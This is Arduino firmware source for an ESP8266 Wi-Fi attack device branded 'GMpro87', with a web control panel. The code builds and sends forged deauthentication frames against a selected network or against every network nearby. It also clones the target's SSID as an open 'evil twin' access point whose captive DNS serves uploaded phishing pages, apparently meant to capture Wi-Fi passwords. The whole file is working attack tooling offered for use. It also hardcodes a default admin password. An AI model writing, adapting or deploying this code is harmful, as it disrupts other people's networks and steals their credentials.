#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

extern "C" {
#include "user_interface.h"
}

// ================= KONFIGURASI =================
#define LED_PIN 2 
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// Global Variables
typedef struct { String ssid; uint8_t ch; uint8_t bssid[6]; int rssi; } _Network;
_Network _networks[16];
_Network _selectedNetwork;
String _eventLogs = "";
bool hotspot_active = false, deauthing_active = false, mass_deauth = false, beacon_spam = false, pass_captured = false;

// Default Settings (Disimpan ke Memory)
String config_ssid = "GMpro2";
String config_pass = "Sangkur87";
int selectedET = 1;
int beacon_count = 10;

// ================= SYSTEM FUNCTIONS =================

void addLog(String msg) {
  _eventLogs = "[" + String(millis()/1000) + "s] " + msg + "\n" + _eventLogs;
  if (_eventLogs.length() > 1500) _eventLogs = _eventLogs.substring(0, 1500);
}

void saveSettings() {
  File f = LittleFS.open("/config.txt", "w");
  if (f) {
    f.println(config_ssid); f.println(config_pass);
    f.println(selectedET); f.println(beacon_count);
    f.close();
  }
}

void loadSettings() {
  if (LittleFS.exists("/config.txt")) {
    File f = LittleFS.open("/config.txt", "r");
    config_ssid = f.readStringUntil('\n'); config_ssid.trim();
    config_pass = f.readStringUntil('\n'); config_pass.trim();
    selectedET = f.readStringUntil('\n').toInt();
    beacon_count = f.readStringUntil('\n').toInt();
    f.close();
  }
}

void sendDeauth(uint8_t* bssid, uint8_t ch) {
  wifi_set_channel(ch);
  uint8_t pkt[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0,0,0,0,0,0, 0,0,0,0,0,0, 0x00, 0x00, 0x01, 0x00};
  memcpy(&pkt[10], bssid, 6); memcpy(&pkt[16], bssid, 6);
  wifi_send_pkt_freedom(pkt, 26, 0);
}

// ================= WEB HANDLERS =================

void handleRoot() {
  // Logic Actions
  if (webServer.hasArg("scan")) { 
    int n = WiFi.scanNetworks(false, true);
    for (int i = 0; i < n && i < 16; ++i) {
      _networks[i].ssid = (WiFi.SSID(i) == "") ? "<HIDDEN>" : WiFi.SSID(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
      _networks[i].ch = WiFi.channel(i); _networks[i].rssi = WiFi.RSSI(i);
    }
    addLog("Scan Found: " + String(n));
  }

  if (webServer.hasArg("ap")) {
    for (int i=0; i<16; i++) {
        String bssidStr = ""; 
        for(int j=0; j<6; j++) { bssidStr += String(_networks[i].bssid[j], HEX); if(j<5) bssidStr+=":"; }
        if (webServer.arg("ap") == bssidStr) { _selectedNetwork = _networks[i]; addLog("Target: " + _selectedNetwork.ssid); }
    }
  }

  if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "1");
  if (webServer.hasArg("mass")) mass_deauth = (webServer.arg("mass") == "1");
  if (webServer.hasArg("hotspot")) {
    hotspot_active = (webServer.arg("hotspot") == "1");
    if (hotspot_active) { WiFi.softAP(_selectedNetwork.ssid.c_str(), "", _selectedNetwork.ch); } 
    else { WiFi.softAP(config_ssid.c_str(), config_pass.c_str()); }
  }

  if (webServer.hasArg("save")) {
    config_ssid = webServer.arg("s_ssid"); config_pass = webServer.arg("s_pass");
    selectedET = webServer.arg("s_tmpl").toInt();
    saveSettings(); webServer.send(200, "text/plain", "Saved! Rebooting..."); delay(1000); ESP.restart();
  }

  // --- RENDER HTML ASLI (LOCKED) ---
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>";
  html += "body { font-family: 'Courier New', Courier, monospace; background: #0d0d0d; color: #00ff00; margin: 0; padding: 10px; }";
  html += ".content { max-width: 500px; margin: auto; border: 1px solid #00ff00; padding: 15px; box-sizing: border-box; }";
  html += ".header-box { text-align: center; border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 15px; }";
  html += ".tabs { display: flex; gap: 5px; margin-bottom: 15px; }";
  html += ".tabs button { flex: 1; background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 10px; cursor: pointer; font-weight: bold; font-size: 12px; }";
  html += ".active-btn { background: #00ff00 !important; color: #000 !important; }";
  html += ".tab-content { display: none; border-top: 1px solid #333; padding-top: 15px; }";
  html += ".show { display: block; }";
  html += "table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 11px; table-layout: fixed; }";
  html += "th, td { border: 1px solid #00ff00; padding: 6px 4px; text-align: center; overflow: hidden; } th { background: #1a1a1a; }";
  html += ".btn { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 5px; cursor: pointer; text-decoration: none; font-size: 10px; width: 100%; display: block; box-sizing: border-box; }";
  html += ".btn-red { border-color: #ff0000; color: #ff0000; }";
  html += "input, select { background: #000; color: #0f0; border: 1px solid #0f0; padding: 6px; box-sizing: border-box; width: 100%; font-family: 'Courier New'; }";
  html += "textarea { width: 100%; box-sizing: border-box; background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; font-size: 10px; }";
  html += "</style></head><body><div class='content'><div class='header-box'><h2>GMpro87</h2><span>by : 9u5M4n9</span></div>";
  html += "<div class='tabs'><button id='btn-m' class='active-btn' onclick='openTab(\"m\")'>MAIN</button><button id='btn-a' onclick='openTab(\"a\")'>ATTACK</button><button id='btn-s' onclick='openTab(\"s\")'>SETTING</button></div>";
  
  // Tab Main
  html += "<div id='m' class='tab-content show'><button class='btn' onclick='location=\"/?scan=1\"' style='background:#0f0; color:#000; margin-bottom:10px;'>RESCAN NETWORKS</button>";
  html += "<div style='display:flex; gap:5px;'><a href='/?deauth=" + String(!deauthing_active) + "' style='flex:1'><button class='btn'>" + (deauthing_active?"STOP":"START") + " DEAUTH</button></a>";
  html += "<a href='/?hotspot=" + String(!hotspot_active) + "' style='flex:1'><button class='btn'>" + (hotspot_active?"STOP":"START") + " ETWIN</button></a></div>";
  html += "<table><thead><tr><th>SSID</th><th>CH</th><th>SNR%</th><th>SELECT</th></tr></thead><tbody>";
  for(int i=0; i<16; i++) {
    if(_networks[i].ssid == "") continue;
    String bssidStr = ""; for(int j=0; j<6; j++) { bssidStr += String(_networks[i].bssid[j], HEX); if(j<5) bssidStr+=":"; }
    html += "<tr><td>" + _networks[i].ssid + "</td><td>" + String(_networks[i].ch) + "</td><td>" + String(2*(_networks[i].rssi+100)) + "%</td>";
    html += "<td><a href='/?ap=" + bssidStr + "'><button class='btn'>SELECT</button></a></td></tr>";
  }
  html += "</tbody></table></div>";

  // Tab Attack & Setting
  html += "<div id='a' class='tab-content'><h3>Attack Panel</h3><a href='/?mass=1'><button class='btn'>START MASS DEAUTH</button></a></div>";
  html += "<div id='s' class='tab-content'><h3>File Manager</h3><form action='/upload' method='POST' enctype='multipart/form-data'><input type='file' name='upload'><button type='submit' class='btn' style='background:#0f0; color:#000; margin-top:5px;'>UPLOAD FILE</button></form><hr>";
  html += "<h3>Config</h3><form action='/' method='GET'><label>Template:</label><select name='s_tmpl'><option value='1'>etwin1.html</option><option value='2'>etwin2.html</option></select>";
  html += "<br><label>Admin SSID:</label><input name='s_ssid' value='" + config_ssid + "'><br><label>Admin Pass:</label><input name='s_pass' value='" + config_pass + "'><br>";
  html += "<button type='submit' name='save' value='1' class='btn' style='background:#0f0; color:#000; padding:10px;'>SAVE & RESTART</button></form></div>";

  html += "<hr><h4>Logs</h4><textarea rows='6' readonly>" + _eventLogs + "</textarea></div>";
  html += "<script>function openTab(t){document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('show'));document.querySelectorAll('.tabs button').forEach(x=>x.classList.remove('active-btn'));document.getElementById(t).classList.add('show');document.getElementById('btn-'+t).classList.add('active-btn');}</script></body></html>";
  webServer.send(200, "text/html", html);
}

// ================= SETUP & LOOP =================

void setup() {
  pinMode(LED_PIN, OUTPUT);
  LittleFS.begin();
  loadSettings();
  
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(config_ssid.c_str(), config_pass.c_str());

  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.on("/", handleRoot);
  webServer.on("/upload", HTTP_POST, [](){ webServer.sendHeader("Location", "/"); webServer.send(302, "text/plain", ""); }, [](){
    HTTPUpload& upload = webServer.upload();
    if (upload.status == UPLOAD_FILE_START) { File f = LittleFS.open("/" + upload.filename, "w"); f.close(); }
    else if (upload.status == UPLOAD_FILE_WRITE) { File f = LittleFS.open("/" + upload.filename, "a"); f.write(upload.buf, upload.currentSize); f.close(); }
  });

  webServer.onNotFound([]() {
    if (hotspot_active) {
        File f = LittleFS.open("/etwin" + String(selectedET) + ".html", "r");
        webServer.streamFile(f, "text/html"); f.close();
    } else { handleRoot(); }
  });

  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  static unsigned long last_atk = 0;
  if (millis() - last_atk >= 200) {
    if (deauthing_active && _selectedNetwork.ssid != "") sendDeauth(_selectedNetwork.bssid, _selectedNetwork.ch);
    if (mass_deauth) { for(int i=0; i<16; i++) if(_networks[i].ssid != "") sendDeauth(_networks[i].bssid, _networks[i].ch); }
    last_atk = millis();
  }
}
